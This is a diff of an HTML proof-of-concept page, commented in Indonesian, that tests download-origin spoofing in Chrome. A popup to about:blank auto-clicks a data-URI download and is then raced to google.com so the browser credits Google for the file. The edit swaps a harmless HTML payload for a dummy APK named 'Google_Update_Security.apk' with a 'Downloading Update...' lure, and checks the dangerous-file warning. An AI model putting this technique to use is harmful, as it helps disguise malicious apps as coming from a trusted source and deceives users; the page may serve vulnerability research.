@@ -2,102 +2,71 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Origin Spoofing Research - Download Gesture</title>
+    <title>Origin Spoofing - APK Download Test</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 30px; line-height: 1.6; }
-        .container { max-width: 600px; margin: auto; border: 1px solid #ccc; padding: 20px; border-radius: 8px; }
+        body { font-family: sans-serif; padding: 30px; background: #f4f4f9; }
+        .box { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; border: 1px solid #ddd; }
         button { 
-            background-color: #007bff; color: white; border: none; 
-            padding: 15px 25px; font-size: 18px; border-radius: 5px; cursor: pointer;
-            width: 100%;
+            background: #28a745; color: white; border: none; padding: 15px; 
+            width: 100%; font-size: 16px; border-radius: 5px; cursor: pointer; 
         }
-        button:hover { background-color: #0056b3; }
-        pre { background: #222; color: #00ff00; padding: 15px; border-radius: 5px; overflow-x: auto; font-size: 13px; }
-        .note { font-size: 12px; color: #666; margin-top: 10px; }
+        pre { background: #000; color: #0f0; padding: 10px; margin-top: 20px; font-size: 12px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>PoC: Download Origin Attribution Test</h2>
-    <p>Klik tombol di bawah untuk membuka popup <code>about:blank</code>, memicu unduhan file <code>data:</code>, dan melakukan navigasi cepat ke Google.</p>
-    
-    <button id="trigger">Mulai Pengujian</button>
-    
-    <h4>Log Aktivitas:</h4>
-    <pre id="log">Menunggu interaksi...</pre>
-
-    <div class="note">
-        <strong>Tujuan Riset:</strong> Periksa "Download Bubble" di pojok kanan atas Chrome. Jika tertulis "google.com", maka terjadi <em>Origin Misattribution</em>.
-    </div>
+<div class="box">
+    <h3>APK Origin Spoofing Test</h3>
+    <p>PoC ini akan mencoba memicu unduhan file <code>.apk</code> melalui <code>about:blank</code> lalu navigasi ke domain target.</p>
+    <button id="go">Jalankan Pengujian</button>
+    <pre id="log">Status: Ready</pre>
 </div>
 
 <script>
-const logEl = document.getElementById("log");
-function updateLog(msg) {
-    const timestamp = new Date().toLocaleTimeString();
-    logEl.textContent += `\n[${timestamp}] ${msg}`;
-}
+const log = m => document.getElementById("log").textContent += "\n> " + m;
 
-document.getElementById("trigger").onclick = () => {
-    logEl.textContent = "[STREAMS START]";
-    updateLog("User click detected.");
+document.getElementById("go").onclick = () => {
+    log("Memulai...");
 
-    // 1. Membuka popup ke about:blank menggunakan User Gesture dari klik utama
-    const popup = window.open(
-        "about:blank", 
-        "testPopup", 
-        "width=500,height=500,top=100,left=100"
-    );
-
-    if (!popup) {
-        updateLog("ERROR: Popup diblokir oleh browser.");
+    // 1. Buka popup about:blank
+    const w = window.open("about:blank", "poc_window", "width=600,height=400");
+    
+    if(!w) {
+        log("Error: Popup diblokir!");
         return;
     }
-    updateLog("Popup about:blank berhasil dibuka.");
 
-    // Payload data:URI (berisi file HTML sederhana)
-    const payload = "data:text/html;base64,PGgxPlBvQyBTdWNjZXNzPC9oMT48c2NyaXB0PmFsZXJ0KCdEb3dubG9hZGVkJyk8L3NjcmlwdD4=";
+    // 2. Payload APK (Minimal valid APK structure atau dummy data)
+    // Di sini kita gunakan base64 dari string dummy untuk simulasi file .apk
+    const apkData = "data:application/vnd.android.package-archive;base64,UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAACQAAAG1ldGEtaW5mL1BLAwQUAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAYW5kcm9pZG1hbmlmZXN0LnhtbFBLAQIUAxQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAACAAAAAbWV0YS1pbmYvUEsBAhQDFAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAAAAMAAAAAYW5kcm9pZG1hbmlmZXN0LnhtbFBLBQYAAAAAAgACAHAAAABkAAAAAAA=";
 
-    // 2. Menulis elemen download ke dalam about:blank
-    // Kita menggunakan document.write agar script di dalam popup langsung dieksekusi
-    popup.document.write(`
+    // 3. Injeksi ke about:blank
+    w.document.write(`
         <html>
-        <head><title>Processing...</title></head>
         <body>
-            <p>Menginisiasi unduhan file...</p>
-            <a id="dl_link" href="${payload}" download="poc_result.html"></a>
+            <p>Downloading Update...</p>
+            <a id="link" href="${apkData}" download="Google_Update_Security.apk"></a>
             <script>
-                // Eksekusi klik otomatis di konteks about:blank
                 setTimeout(() => {
-                    const link = document.getElementById('dl_link');
-                    link.click();
-                    window.opener.postMessage('download_triggered', '*');
+                    document.getElementById('link').click();
                 }, 50);
             <\/script>
         </body>
         </html>
     `);
 
-    // 3. Race Condition: Navigasi ke domain bereputasi (Google)
-    // Kita menunggu sinyal dari popup atau menggunakan timer presisi
+    // 4. Navigasi Cepat (Race Condition)
+    // Sesuaikan timer (100ms - 500ms) untuk menangkap momen UI Rendering
     setTimeout(() => {
         try {
-            popup.location.href = "https://www.google.com";
-            updateLog("Popup diarahkan ke google.com.");
-            updateLog("PERIKSA: Apakah origin di UI Download menunjukkan google.com?");
-        } catch (e) {
-            updateLog("ERROR Navigasi: " + e.message);
+            w.location.href = "https://www.google.com";
+            log("Navigasi ke Google dilakukan.");
+            log("Cek dialog peringatan 'File ini berbahaya' di Chrome.");
+        } catch(e) {
+            log("Navigasi gagal: " + e);
         }
-    }, 150); // Jeda ini kritikal: harus cukup lama agar download mulai, tapi cukup cepat sebelum UI render selesai
+    }, 200);
 };
-
-// Mendengarkan pesan dari popup jika diperlukan
-window.addEventListener("message", (event) => {
-    if (event.data === 'download_triggered') {
-        updateLog("Popup mengonfirmasi unduhan dipicu.");
-    }
-});
 </script>
 
 </body>
